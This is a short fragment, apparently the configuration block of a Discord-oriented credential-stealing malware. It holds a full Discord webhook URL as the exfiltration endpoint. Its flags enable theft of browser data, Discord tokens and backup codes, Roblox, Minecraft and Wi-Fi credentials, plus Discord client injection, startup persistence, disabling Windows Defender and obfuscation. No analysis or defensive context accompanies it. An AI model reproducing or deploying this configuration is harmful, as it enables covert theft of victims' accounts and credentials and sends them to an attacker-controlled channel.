...
__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1134182846341320824/SDMezD8gjL4mAbh41pFYSxcFonc3UYlFBLIMwQzGZbzZJNI9jrkvxlKba6tT9mCO85CM', 'ping': True, 'pingtype': 'Everyone', 'error': True, 'startup': True, 'defender': True, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': True, 'obfuscation': True, 'injection': True, 'minecraft': True, 'wifi': True, 'killprotector': True, 'antidebug_vm': False, 'discord': True, 'anti_spam': True, 'self_destruct': False}
